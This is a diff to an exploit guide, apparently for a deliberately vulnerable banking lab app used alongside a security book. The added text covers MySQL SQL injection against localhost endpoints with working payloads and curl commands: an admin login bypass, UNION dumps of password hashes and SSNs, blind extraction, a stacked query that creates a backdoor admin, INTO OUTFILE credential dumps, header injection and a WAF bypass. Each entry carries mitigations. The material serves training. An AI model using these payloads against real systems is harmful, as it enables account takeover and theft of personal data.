@@ -19,9 +19,12 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
 --------------------------------------------------------------------------------
  INDEX
 --------------------------------------------------------------------------------
- [01]  SQL injection — login form          (Ch 13)
- [02]  SQL injection — accounts search      (Ch 13)
- [03]  SQL injection — admin user search    (Ch 13)
+ [01]  SQL injection — login form (MySQL)                       (Ch 11)
+ [02]  SQL injection — accounts search (MySQL, UNION/blind/time/stacked/OOB) (Ch 11)
+ [03]  SQL injection — admin user search                     (Ch 11)
+ [03a] SQL injection — header sink on /sqli/lookup            (Ch 11)
+ [03b] SQL injection — naive WAF blacklist bypass on /sqli/safe-lookup (Ch 11)
+ [03c] SQL injection — OOB INTO OUTFILE on /sqli/oob/leak     (Ch 11)
  [04]  Reflected XSS — search result page   (Ch 14)
  [05]  Stored XSS — support messages        (Ch 14)
  [06]  DOM-based XSS — location.hash sink   (Ch 14, 34)
@@ -91,44 +94,152 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
 
 
 --------------------------------------------------------------------------------
- [01] SQL injection — login form
+ [01] SQL injection — login form (MySQL)
 --------------------------------------------------------------------------------
 Endpoint:   POST /login
 Files:      routes/auth.js (login handler concatenates `username` into SQL)
+Backend:    MySQL 8 via mysql2 (lib/db.js with multipleStatements:true)
 
-EXPLOIT
-  curl -i -c j.cookie http://localhost:3001/login \
-    -d "username=' OR '1'='1' --&password=anything&next=/accounts"
-  # Logs in as the first user in the table (alice.chen).
+EXPLOIT (login bypass as admin julie.morgan)
+  # MySQL requires the line-comment marker to be followed by whitespace
+  # OR the alternate marker `#` (which needs no trailing space). The bare
+  # `--` does NOT comment in MySQL and returns HTTP 500.
+  curl -i -X POST http://localhost:3001/login \
+    --data-urlencode "username=julie.morgan'#" \
+    --data-urlencode 'password=x'
+  # → HTTP 302 Location: /accounts (signed in as julie.morgan)
 
-MITIGATION
-  Use parameterised queries (better-sqlite3 supports `.prepare(...).get(?)`).
-  Verify password with a constant-time comparator after argon2id verification.
-
---------------------------------------------------------------------------------
- [02] SQL injection — accounts search
---------------------------------------------------------------------------------
-Endpoint:   GET /accounts/search?q=...
-
-EXPLOIT
-  # union-based — dump password hashes
-  /accounts/search?q=x' UNION SELECT username, password_md5, role FROM users--
-  # boolean-based — confirm injection
-  /accounts/search?q=' OR '1'='1
+  # Equivalent with -- + trailing space:
+  curl -i -X POST http://localhost:3001/login \
+    --data-urlencode "username=julie.morgan'-- " \
+    --data-urlencode 'password=x'
+  # → HTTP 302
 
 MITIGATION
-  Use a parameterised LIKE: `db.prepare('SELECT ... LIKE ?').all('%' + q + '%')`.
+  Use parameterised queries: `db.prepare('SELECT * FROM users WHERE username = ?').get(username)`.
+  Verify the password with a constant-time comparator after argon2id.
+  Set multipleStatements:false on the MySQL connection.
 
 --------------------------------------------------------------------------------
- [03] SQL injection — admin user search
+ [02] SQL injection — accounts search (MySQL, all techniques)
 --------------------------------------------------------------------------------
-Endpoint:   GET /admin/users?q=...    (after logging in as ANY user — BAC chain)
+Endpoint:   GET /accounts/search?q=...    (any authenticated user)
 
-EXPLOIT
-  /admin/users?q=%' UNION SELECT 1,username,password_md5,email,ssn,role FROM users--
+ERROR PROBE
+  # Single `'` parses silently in MySQL via modulo coercion. Use `'a`.
+  /accounts/search?q='a   → 500, leaks query fragment + MySQL banner
+
+UNION EXTRACTION
+  # 3-column UNION; CONCAT is required (|| is boolean OR in MySQL).
+  # MySQL line comments require trailing whitespace; `-- -` survives URL
+  # encoding because the trailing `-` blocks form `+` -> space stripping.
+  /accounts/search?q=' UNION SELECT 0, CONCAT(username,'/',password_md5,'/',ssn), 0 FROM users-- -
+  # → row per user in vulnbank.users (alice, bob, carol, david, eva,
+  #   julie, finance_audit, backdoor).
+
+BOOLEAN-BLIND ORACLE
+  /accounts/search?q=' AND 1=1#   → 200, ~2546 bytes (Alice row included)
+  /accounts/search?q=' AND 1=2#   → 200, ~1298 bytes (empty)
+  # ~1.2KB delta is the yes/no signal. Iterate with SUBSTRING() on a
+  # subquery to extract julie's MD5 one hex digit at a time.
+
+TIME-BASED BLIND
+  /accounts/search?q=' UNION SELECT SLEEP(3),2,3#   → ~3.0s response
+  /accounts/search?q=' AND IF(SUBSTRING((SELECT password_md5 FROM users WHERE username='julie.morgan'),1,1)='7',SLEEP(3),0)#
+  # → 3s when bit matches, instant when not. First digit of julie's hash is `7`.
+
+STACKED QUERY (multipleStatements:true on mysql2 connection)
+  /accounts/search?q=chen'; INSERT INTO users (username,password_md5,role,full_name,email,ssn) VALUES ('backdoor2','2c103f2c4ed1e59c0b4e2e01821770fa','admin','BD2','b2@x.test','000-00-0001');-- -
+  # → HTTP 200 with the original chen-row result. A new admin row exists.
+  # Hash 2c10... = md5('Password123!'). Log in as backdoor2/Password123! → admin.
+
+OUT-OF-BAND FILE WRITE (FILE grant present, secure_file_priv empty)
+  /accounts/search?q=' UNION SELECT username,password_md5,ssn FROM users INTO OUTFILE '/var/lib/mysql-files/leak.txt'-- -
+  # → HTTP 200, empty page. File on DB server contains tab-separated
+  #   credentials for every user. Read with:
+  #   docker compose exec mysql cat /var/lib/mysql-files/leak.txt
+
+FINGERPRINT (UNION extracts MySQL version)
+  /accounts/search?q=' UNION SELECT 0,@@version,0-- -   → e.g. "8.0.35"
 
 MITIGATION
-  Parameterised query AND a real role check via middleware.
+  - Parameterise: `db.prepare('SELECT ... WHERE full_name LIKE ? OR account_number LIKE ?').all('%'+q+'%','%'+q+'%')`.
+  - Set multipleStatements:false on the mysql2 connection (closes stacked).
+  - REVOKE FILE ON *.* FROM 'bank'@'%' (closes INTO OUTFILE / LOAD_FILE).
+  - Set secure_file_priv=NULL in my.cnf to disable file I/O entirely.
+  - Strip SQL fragments from 500 error pages.
+
+--------------------------------------------------------------------------------
+ [03] SQL injection — admin user search (MySQL)
+--------------------------------------------------------------------------------
+Endpoint:   GET /admin/users?q=...    (julie.morgan or any account elevated via [01])
+
+EXPLOIT
+  # 7-column UNION (admin user-search renders 7 columns).
+  /admin/users?q=' UNION SELECT 1,username,password_md5,email,ssn,role,0 FROM users-- -
+
+MITIGATION
+  Parameterised query AND a real role check in middleware (currently any
+  authenticated session reaches /admin/users — see [08]).
+
+--------------------------------------------------------------------------------
+ [03a] SQL injection — header sink on /sqli/lookup
+--------------------------------------------------------------------------------
+Endpoint:   GET /sqli/lookup    (any authenticated session)
+Header:     X-Customer-ID  (interpolated directly into SQL WHERE clause)
+File:       routes/sqli.js (lines 27–42)
+
+EXPLOIT
+  # Legit
+  curl -b sess.jar -H 'X-Customer-ID: 1' http://localhost:3001/sqli/lookup
+  # → {"sql":"... WHERE id = 1","rows":[{alice...}]}
+
+  # UNION through the header (4-column SELECT)
+  curl -b sess.jar \
+    -H 'X-Customer-ID: 0 UNION SELECT username,password_md5,ssn,full_name FROM users-- -' \
+    http://localhost:3001/sqli/lookup
+  # → JSON with every user row exposed.
+
+MITIGATION
+  Bind the header value as a parameter; cast to integer at the boundary;
+  treat headers as untrusted input (most WAFs do not fuzz custom headers).
+
+--------------------------------------------------------------------------------
+ [03b] SQL injection — naive WAF blacklist bypass on /sqli/safe-lookup
+--------------------------------------------------------------------------------
+Endpoint:   GET /sqli/safe-lookup    (any authenticated session)
+Header:     X-Customer-ID  (rejected if matches /union\s+select/i, /--/, /;/)
+File:       routes/sqli.js (lines 51–63)
+
+EXPLOIT
+  # Blocked: literal UNION SELECT
+  curl -b sess.jar -H 'X-Customer-ID: 0 UNION SELECT username,password_md5,ssn,full_name FROM users-- -' \
+    http://localhost:3001/sqli/safe-lookup
+  # → {"error":"WAF blocked: /union\\s+select/i"}
+
+  # Bypassed: SQL inline comment between UNION and SELECT, # instead of --
+  curl -b sess.jar -H 'X-Customer-ID: 0 UNION/**/SELECT username,password_md5,ssn,full_name FROM users#' \
+    http://localhost:3001/sqli/safe-lookup
+  # → JSON with every user row exposed.
+
+MITIGATION
+  Pattern-matching SQL keywords from outside the parser is unsound; the only
+  fix is parameter binding (which makes the WAF unnecessary).
+
+--------------------------------------------------------------------------------
+ [03c] SQL injection — OOB INTO OUTFILE on /sqli/oob/leak
+--------------------------------------------------------------------------------
+Endpoint:   GET /sqli/oob/leak?path=<path>    (any authenticated session)
+File:       routes/sqli.js (lines 69–77)
+
+EXPLOIT
+  curl -b sess.jar 'http://localhost:3001/sqli/oob/leak?path=/var/lib/mysql-files/leak.txt'
+  # → {"ok":true}; cat /var/lib/mysql-files/leak.txt on DB server shows full dump.
+
+MITIGATION
+  This route is a deliberate convenience wrapper for the chapter. In real
+  code: REVOKE FILE from the application account; set secure_file_priv to
+  a controlled directory; never expose a SQL-building helper to user input.
 
 --------------------------------------------------------------------------------
  [04] Reflected XSS — search result page
